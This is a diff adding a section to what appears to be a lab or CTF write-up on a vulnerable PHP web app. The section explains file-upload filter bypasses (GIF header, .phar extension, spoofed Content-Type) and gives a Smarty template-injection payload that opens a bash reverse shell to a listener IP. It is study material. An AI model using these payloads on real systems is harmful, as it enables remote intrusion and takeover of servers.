@@ -83,3 +83,33 @@ echo '<td>'.$row[3].'</td>';
 # Sanitized
 echo '<td><i>'.htmlentities($row[1]).'</i></td>';
 ```
+
+<br>
+
+### Command Execution
+You have 3 main options to get command execution:
+* Via file upload
+* Via SSTI
+* Via deserialization
+
+<br>
+
+#### File Upload
+There is a file upload options that do some checks on **upload_images.php**, but they are easily bypassed. This is automated in **rces.py**.
+
+You can bypass **getimagesize** by including a gif header on the payload, use **.phar** to bypass extension check and change Content-Type to image/gif to bypass **allowed_mime**.
+
+<br>
+
+#### SSTI
+You can modified the index message from **/admin/update_motd.php**. This is vulnerable to template injection. On index.php, we discover that Smarty framework is being used.
+
+We can execute command with the payload above and this is automated in **rces.py**.
+```
+{php}exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.159.131/9000 0>&1'");{/php}
+```
+
+<br>
+
+#### Deserialization
+In progress, didn't understand a thing 😭
